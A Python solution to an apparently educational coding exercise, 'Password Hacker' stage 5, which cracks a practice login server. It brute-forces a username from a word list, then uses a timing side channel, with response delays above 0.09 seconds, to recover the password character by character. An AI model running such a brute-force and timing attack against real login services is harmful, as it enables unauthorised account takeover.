"""
Project: Password Hacker
Stage 5/5: Time-based vulnerability


Description
Your program has successfully hacked the new system! However, you've been spotted: the admin noticed your first failed attempts, found the vulnerability and made a patch. You should overcome this patch and hack the system again. It’s not easy being a hacker!

The admin has improved the server: the program now catches the exception and sends a simple ‘wrong password’ message to the client even when the real password starts with current symbols.

But here's the thing: the admin probably just caught this exception. We know that catching an exception takes the computer a long time, so there should be a delay in the server response when this exception takes place. You can use it to hack the system: count the time period in which the response comes and find out which starting symbols work out for the password.

Objectives
In this stage, you should write a program that uses the time vulnerability to find the password.

Use the list of logins from the previous stage.
Output the result as you did this in the previous stage.
Examples
The greater-than symbol followed by a space (> ) represents the user input. Note that it's not part of the input.

Example 1:

> python hack.py localhost 9090
{
    "login" : "su",
    "password" : "fTUe3O99Rre"
}
Example 2:

> python hack.py localhost 9090
{"login": "admin3", "password": "mlqDz33x"}
"""


import json
import socket
import sys
import time


letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
           'h', 'i', 'j', 'k', 'l', 'm', 'n',
           'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z',
           '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
           'A', 'B', 'C', 'D', 'E', 'F', 'G',
           'H', 'I', 'J', 'K', 'L', 'M', 'N',
           'O', 'P', 'Q', 'R', 'S', 'T', 'U',
           'V', 'W', 'X', 'Y', 'Z']


with open(r'.\hacking\logins.txt', 'r') as file:
    logins_list = file.read().split()

host_name, port = sys.argv[1:]
with socket.socket() as client_socket:
    client_socket.connect((host_name, int(port)))
    wrong_login = json.dumps({"result": "Wrong login!"})
    wrong_password = json.dumps({"result": "Wrong password!"})
    exception_happened = json.dumps({"result": "Exception happened during login"})
    connection_success = json.dumps({"result": "Connection success!"})
    login = ''
    password = ''
    for word in logins_list:
        json_send = json.dumps({"login": word.rstrip(), "password": " "})
        client_socket.send(json_send.encode())
        response = client_socket.recv(1024).decode()
        if response != wrong_login:
            login = word.rstrip()
            break
    while True:
        for letter in letters:
            json_send = json.dumps({"login": login, "password": password + letter})
            client_socket.send(json_send.encode())
            old_time = time.time()
            response = client_socket.recv(1024).decode()
            new_time = time.time()
            if new_time - old_time > 0.09:
                password += letter
                break
            if response == connection_success:
                password += letter
                print(json.dumps({"login": login, "password": password}))
                exit()
